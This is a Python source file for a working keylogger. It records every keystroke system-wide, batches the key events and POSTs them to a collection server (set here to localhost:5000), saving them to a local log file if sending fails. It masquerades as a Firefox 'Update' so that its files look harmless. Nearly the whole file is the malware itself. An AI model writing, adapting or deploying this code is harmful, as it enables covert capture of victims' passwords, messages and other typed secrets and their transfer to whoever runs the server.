import os
import json
from typing import (
    Any,
    Literal,
    TypeAlias,
)

import keyboard  # type: ignore
import appdirs
import requests

__author__ = "NiumXp and Bonney.py"
__version__ = "0.0.1"

APP_NAME = "Update"
APP_AUTHOR = "Firefox"
APP_VERSION = __version__

SERVER_URL = "http://127.0.0.1:5000"
SERVER_POST_LOG_URL = SERVER_URL + "/log"
SERVER_POST_CHUNK_URL = SERVER_URL + "/chunk"

LOG_FILENAME = APP_NAME + ".log"
LOG_FILES_PATH = appdirs.user_log_dir(APP_NAME, APP_AUTHOR)
LOG_FILE_PATH = os.path.join(LOG_FILES_PATH, LOG_FILENAME)

MAX_LOGS = 50


class Event:
    name: str
    scan_code: int
    event_type: Literal["down", "up"]


class KeyLog:
    code: int
    name: str
    event: Literal[0, 1]

    amount: int

    def __init__(self, code: int, name: str, event: Literal[0, 1]) -> None:
        self.code = code
        self.name = name
        self.event = event

        self.amount = 1

    def __str__(self) -> str:
        return self.to_json()

    def __repr__(self) -> str:
        return f"<KeyLog {self.amount} {self.name}, {self.code}, {self.event!r}>"

    def __eq__(self, other: Any) -> bool:
        return (
            isinstance(other, type(self))
            and self.code == other.code
            and self.name == self.name
            and self.event == other.event
        )

    @classmethod
    def from_event(cls, event: Event) -> "KeyLog":
        type_ = 0 if event.event_type == "down" else 1

        return cls(
            event.scan_code,
            event.name,
            type_,
        )

    def to_tuple(self) -> tuple[int, str, Literal[0, 1], int]:
        return (
            self.code,
            self.name,
            self.event,
            self.amount,
        )
    
    def to_json(self) -> str:
        data = self.to_tuple()
        return json.dumps(data, separators=(",", ":"))

    def count(self) -> None:
        self.amount += 1


LogChunk: TypeAlias = tuple[KeyLog, ...]


def send(chunk: LogChunk) -> None:
    response = requests.post(
        SERVER_POST_CHUNK_URL,
        json=[log.to_tuple() for log in chunk],
    )
    response.raise_for_status()

    if response.status_code not in range(200, 300):
        raise Exception("Server error")


def save(chunk: LogChunk, error: Exception) -> None:
    if not os.path.isfile(LOG_FILE_PATH):
        os.makedirs(LOG_FILES_PATH, exist_ok=True)

    with open(LOG_FILE_PATH, 'a') as file:
        print(*chunk, sep=',', end=',', file=file)


logs: list[KeyLog] = []


while True:
    event: Event = keyboard.read_event()  # type: ignore

    data: KeyLog = KeyLog.from_event(event)

    if not logs:  # empty
        logs.append(data)
        continue

    last = logs[-1]

    if data == last:
        last.count()
        continue

    logs.append(data)

    if len(logs) == MAX_LOGS:
        chunk: LogChunk = tuple(logs)

        try:
            send(chunk)
        except Exception as error:
            save(chunk, error)

        logs.clear()
